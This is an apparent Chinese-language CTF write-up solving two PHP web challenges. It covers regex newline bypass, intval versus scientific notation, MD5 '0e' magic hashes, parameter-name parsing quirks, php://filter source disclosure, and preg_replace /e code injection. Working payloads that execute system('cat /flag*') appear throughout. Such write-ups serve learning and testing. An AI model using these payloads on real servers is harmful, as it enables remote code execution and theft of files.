    ZeroG_2026（Stage 2）

    三层，一层比一层贴源码。

    第一层：正则 + 严格不等

    if (isset($_GET['zero'])
    && preg_match('/^ZeroG 2026!$/', $_GET['zero'])
    && $_GET['zero'] !== 'ZeroG 2026!') {

    审计代码第一层：正则里的 ^ 意味着从第一个字符就要匹配，$ 意味着到这里就要终止，所以原字符串要是 ZeroG 2026!，但是后面又要 !==（严格不等）。

    这里补充 PCRE 的 $：它除了匹配字符串末尾，还可以匹配"末尾换行之前"，所以在末尾加上 \n 也可以，这样就绕过了第一层。

    ?zero=ZeroG%202026!%0A

    第二层：intval 和算术运算用两套规则

    if (intval($_GET['xp']) < 2026 && intval($_GET['xp'] + 4) > 2030) {

    这里用到了 intval，就系统去补充了一下相关知识：

    行为 例子
    截断小数点 intval(0.9) = 0
    只取前导数字 intval("123abc") = 123
    反过来不行 intval("abc123") = 0（不是 123）
    带进制参数 intval($a, $b) $b = 0 时看前缀：0 开头按 8 进制、0x 开头按 16 进制，否则按 10 进制

    接着看到这里：既要小于 2026，又要加 4 之后大于 2030。

    最开始想的是用字符串改小进制，但这里不行。所以想到用 2025e9：

    intval('2025e9')  = 2025            ← 遇到 e 就直接停了
'2025e9' + 4      = 2.025e12        ← 2025×10⁹，算术运算先算完，才交给 intval

    同一个字符串，被两套规则解释：intval() 只认前导整数，算术运算认科学计数法。

    ?zero=ZeroG%202026!%0A&xp=2025e9

    第三层：弱等于模拟强等于 + 一个 [ 的妙用

    if (isset($_POST['Welcome__ctf.2026']) && isset($_POST['mm'])) {
    $a = $_POST['Welcome__ctf.2026'];
    $b = $_POST['mm'];
    if ($a !== $b && md5($a) == md5($b)) {

    用 ==（弱等于）去模拟 !==（强不等）： 找一组 MD5 值都以 0e 开头的数据：

    QNKCDZO   → md5 = 0e830400451993494058024219903391
240610708 → md5 = 0e462097431906509019562562988736854

    两个 0e... 在 == 下都被当成 0 × 10ⁿ = 0，所以相等；但原字符串不同，!== 也成立。

    接着构造：

    Welcome__ctf.2026=QNKCDZO&mm=240610708&code=system('cat /flag*');

    当然没有这么简单 —— 因为 PHP 会把参数名里的 . 转换成 _，所以这个名字根本出不来。

    我也卡在这里很久。

    最后发现的东西

    PHP 7.4 的源码逻辑：循环转换 . 和空格，但是遇到 [ 会直接把它替换成 \0（字符串截断符），然后跳出循环：

    跳出循环之后，PHP 认为这是数组语法，会去寻找与之配对的 ] —— 但是找不到！

    找不到之后，又会把刚刚的 \0 换回 _，恢复完整字符串：

    所以只要把其中一个 _ 改成 [，就能让结果刚好等于原来的名字：

    Welcome__ctf.2026   →  循环走完全程 → 点被转 → Welcome__ctf_2026   ✗
Welcome_[ctf.2026   →  在 [ 处 break → 点没被处理 → 恢复 [ 为 _ → Welcome__ctf.2026   ✓

    一个字符同时做了两件事：截断循环（让点逃过转换）+ 恢复之后补回那个下划线。

    最终 payload：

    Welcome_[ctf.2026=QNKCDZO&mm=240610708&code=system('cat /flag*');

    拿到 flag。

    cat /flag* 和 cat flag* 的区别

    这里试了一下：cat flag* 抓不到，cat /flag* 才能抓到。

    原因是当前工作目录。web 进程的 cwd 是网站目录（/var/www/html 之类），而 flag 文件在根目录 /：

    cat flag*     ← 相对路径，在网站目录里找 → 找不到
cat /flag*    ← 绝对路径，从根目录找     → 命中

    同一类问题在上一道题里是反过来的：那次 cat /index.php 失败、cat index.php 成功，因为文件就在 cwd 里。

    所以路径没有好坏，只有对不对得上文件所在的位置。

    一个版本细节

    intval('2025e9') 只在 PHP 5 上返回 2025。

    PHP 5:   intval('2025e9') = 2025            ← 遇到 e 就停
PHP 7.1: intval('2025e9') = 2025000000000   ← 也认科学计数法了

    我在本地 PHP 7.4 上实测确认过：intval('2025e9') 返回 2025000000000，第一个条件就直接不成立。

    所以这一关只在 PHP 5 的老环境上成立 —— 换个环境，同一个 payload 就废了。

    [BJDCTF2020] ZJCTF，不过如此

    第一层：text 限制

    $text = $_GET["text"];
$file = $_GET["file"];

if(isset($text) && (file_get_contents($text,'r') === "I have a dream")){
    echo "<br><h1>".file_get_contents($text,'r')."</h1></br>";
    if(preg_match("/flag/", $file)){
        die("Not now!");
    }
    include($file);  //next.php
}

    审计代码，观察 text 有内容限制才能走到 include。

    而且 file_get_contents($text,'r') 的 第一个参数是 $text 本身 —— 也就是说 $text 得是一个「能被读取的东西」，不一定是文件路径。

    这里想到用 data 协议，让 file_get_contents 直接读到我们指定的字符串：

    /?text=data://text/plain,I have a dream

    注意：这一步要让 file_get_contents($text) 返回 I have a dream，不是写文件。

    第二层：include 把 next.php 执行了

    接着构造：

    /?text=data://text/plain,I have a dream&file=next.php

    但是页面并没有给出文件内容 —— 因为 include 把 next.php 当成代码执行了，而不是读出来显示。

    所以改用 php 伪协议 读源码（convert.base64-encode 让它不被执行）：

    /?text=data://text/plain,I have a dream&file=php://filter/read=convert.base64-encode/resource=next.php

    解码后得到 next.php 的源码。

    next.php 源码

    <?php
$id = $_GET['id'];
$_SESSION['id'] = $id;

function complex($re, $str) {
    return preg_replace(
        '/(' . $re . ')/ei',
        'strtolower("\\1")',
        $str
    );
}

foreach($_GET as $re => $str) {
    echo complex($re, $str). "\n";
}

function getFlag(){
    @eval($_GET['cmd']);
}

    先看 foreach：它把 GET 得到的名字传给 $re，值传给 $str。

    接着看这个最重要的正则表达式：i 是忽略大小写，e 是 eval，(...) 把整个匹配包成了捕获组 1，也就是 strtolower 里的 \1；在 PHP 单引号中的 \\1 等效于 \1。

    $re 到底在干什么

    $re 就是 URL 里参数的名字，它被直接拼进了正则。

    foreach($_GET as $re => $str)     // $re = 参数名,$str = 参数值
      ↓
'/(' . $re . ')/ei'              // 参数名成了正则主体

    所以 $re 决定了三件事：

    $re 决定 说明
    匹配什么 它必须能匹配到 $str 里的内容，否则 \1 拿不到东西，注入不成立
    捕获组 1 是什么 整个 $re 被 (...) 包住，所以匹配到的内容就是 \1
    替换串里塞进什么 \1 被原样拼进 strtolower("\1")，然后整体被 eval

    反过来说：

    想要代码执行,必须让 匹配到的内容 = 我们的 payload
而"匹配到的内容"由 $re 决定
→ 所以 $re 必须是一个"什么都匹配"的宽泛正则

    还有两个约束：

    ① $re 里不能有 /      → 会把正则模式提前截断
② $re 不能是 .        → PHP 会把参数名里的 . 换成 _

    /e 为什么能执行代码

    替换串是 strtolower("\1")。带 e 修饰符时，替换串会先做反向引用替换，再把结果当成 PHP 代码执行。

    而 \1 在双引号里，所以只要捕获到的内容带 " 或 ${...}，就能跳出字符串变成真代码。

    PHP 5.x 里 ${表达式} 会对表达式求值：

    strtolower("${phpinfo()}")
           └────┬─────┘
        执行 phpinfo()

    所以我们要做的，就是把 \1 的位置变成 ${getFlag()}。

    试错过程

    先试：

    /?.*=${phpinfo()}

    页面无回显。

    原因：PHP 解析 URL 参数时会把参数名里的 . 和空格统一换成 _，所以 .* 变成了 _*，正则变成 /(_*)/ei —— 匹配不到 ${phpinfo()}，所以没反应。

    换 \S（匹配任意非空白字符）代替 .：

    /?\S*=${phpinfo()}

    成功得到回显。

    为什么必须大写 S

    \S = 非空白字符（大写 S 是「非」）。

    \s = 空白字符 —— 写反了就匹配不到 ${phpinfo()}。

    最终 payload

    /next.php?\S*=${getFlag()}&cmd=system('cat /f*');

    注意最后要有分号 —— eval 执行时需要 ; 作为一条代码的结束。

    CTF2{4497b560-3b8c-48c7-9991-bc1d0d9bce8c}

    为什么 cmd 末尾的分号不能省

    getFlag() 里是：

    @eval($_GET['cmd']);

    所以实际执行的是 eval("system('cat /f*');")。

    eval 把字符串当代码重新解析，必须是一条完整语句：

    eval('echo "A"');    // ❌ syntax error, unexpected end of file, expecting ';'
eval('echo "A";');   // ✅

    完整链路

    ① data:// 骗过 file_get_contents     text=data://text/plain,I have a dream
② php://filter 读源码(不执行)        file=php://filter/read=convert.base64-encode/resource=next.php
③ 看懂 foreach:参数名=正则           $re
④ /e 让替换串被 eval                 strtolower("\1")
⑤ 用 \S* 当参数名(避开 . 被吃)       ?\S*=${phpinfo()}
⑥ 调 getFlag() 并带 cmd              ?\S*=${getFlag()}&cmd=system('cat /f*');

    知识点

    点 内容
    data:// 让 file_get_contents 读到指定内容
    php://filter 读源码而不执行（convert.base64-encode）
    /e 修饰符 PHP 5.x 专用，替换串被 eval；PHP 7 已移除
    ${表达式} PHP 双引号插值里会对表达式求值（{} 单层，不是 {{}}）
    参数名即输入 foreach($_GET as $re => $str) 让参数名成了攻击面
    parse_str 的坑 参数名里 . 和空格会变成 _
    eval 的分号 必须语法完整，@ 会吞掉报错
